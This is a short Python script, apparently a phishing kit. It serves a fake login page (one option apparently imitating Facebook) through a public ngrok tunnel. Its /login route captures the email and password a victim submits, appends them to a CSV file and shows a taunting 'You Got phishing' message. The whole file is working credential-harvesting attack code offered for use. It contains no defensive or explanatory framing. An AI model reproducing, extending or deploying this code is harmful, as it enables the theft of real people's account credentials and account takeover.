from pyngrok import ngrok
from flask import Flask , render_template ,  request
print("Get Your Auth_Token From : https://ngrok.com/")
Auth=input("Your Token")
ngrok.set_auth_token(Auth)
Link=ngrok.connect("5000")
Link


app = Flask(__name__)
print("By bossgeeg123456 : https://github.com/BoszGTec")

print("Follow This Format : <Your Path To>/login fake/")
path=input("Your Path :  ")

print("Choose page [index.html] [face.html]")
page=input("page :  ")

with open(path+"Email+Password.csv",mode='w') as f :
    f.write("""Email , Password""")
    f.close()


app.static_folder=path+"file"
app.template_folder=path+"file"
@app.route("/") 
def index():
 return render_template(page)

@app.route("/login") 
def fake_login() :
  e=request.args.get("email")
  p=request.args.get("password")
  with open(path+"Email+Password.csv",mode='a') as f :
    f.write("""
    {0} , {1} """.format(e,p))
    f.close()
  return """
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <h1>You Got phishing Now !! Email:{0} Password:{1}</h1>
  """.format(e,p)


app.run()
